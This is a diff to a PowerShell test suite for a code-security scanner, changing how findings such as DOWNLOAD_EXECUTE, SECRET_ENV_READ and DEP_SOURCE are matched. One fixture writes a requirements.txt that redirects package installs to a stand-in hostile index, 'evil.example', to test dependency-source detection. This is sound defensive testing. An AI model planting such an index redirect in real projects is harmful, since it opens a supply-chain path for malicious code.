@@ -205,8 +205,8 @@ token = os.getenv("API_TOKEN")
   Set-Content -Encoding UTF8 -LiteralPath (Join-Path $bs 'requirements.txt') -Value '--index-url http://evil.example/simple'
   $r = Invoke-BriefJson $bs
   $t = $r.Target
-  $commentHit = @($t.reference_findings | Where-Object { $_.id -eq 'DOWNLOAD_EXECUTE' -and $_.context -eq 'comment' })
-  $envHit = @($t.findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' -and -not $_.doc })
+  $commentHit = @($t.reference_findings | Where-Object { $_.brief_id -eq 'DOWNLOAD_EXECUTE' -and $_.context -eq 'comment' })
+  $envHit = @($t.findings | Where-Object { $_.brief_id -eq 'SECRET_ENV_READ' -and -not $_.doc })
   $depSrc = @($t.dependency_findings | Where-Object { $_.id -eq 'DEP_SOURCE' })
   $v2ok = $envHit.Count -gt 0 -and $envHit[0].finding_id -and $envHit[0].column -gt 0 -and $envHit[0].confidence
   if ($t.analysis_status -ne 'complete' -or @($t.top3).Count -lt 1 -or $commentHit.Count -lt 1 -or -not $v2ok -or $depSrc.Count -lt 1) {
@@ -230,8 +230,8 @@ print(os.getenv("T"))
 '@
   $r = Invoke-BriefJson $dc
   $t = $r.Target
-  $docCode = @($t.findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' -and $_.context -eq 'doc_code' })[0]
-  $inRef = @($t.reference_findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' }).Count
+  $docCode = @($t.findings | Where-Object { $_.brief_id -eq 'SECRET_ENV_READ' -and $_.context -eq 'doc_code' })[0]
+  $inRef = @($t.reference_findings | Where-Object { $_.brief_id -eq 'SECRET_ENV_READ' }).Count
   if (-not $docCode -or $docCode.execution -ne 'documented' -or $docCode.confidence -ne 'low' -or $inRef -gt 0) {
     Write-Host 'FAIL doc_code 不变量'; $fail++
   } else { Write-Host 'OK doc_code≠reference（risk+documented+low）' }
@@ -302,8 +302,8 @@ print(os.getenv("T"))
   # 20) finding_id 确定性：同一目标两次扫描 id 一致
   $rA = Invoke-BriefJson $bs
   $rB = Invoke-BriefJson $bs
-  $idA = @($rA.Target.findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' })[0].finding_id
-  $idB = @($rB.Target.findings | Where-Object { $_.id -eq 'SECRET_ENV_READ' })[0].finding_id
+  $idA = @($rA.Target.findings | Where-Object { $_.brief_id -eq 'SECRET_ENV_READ' })[0].finding_id
+  $idB = @($rB.Target.findings | Where-Object { $_.brief_id -eq 'SECRET_ENV_READ' })[0].finding_id
   if (-not $idA -or $idA -ne $idB) { Write-Host 'FAIL finding_id 确定性'; $fail++ }
   else { Write-Host 'OK finding_id 确定性' }
 
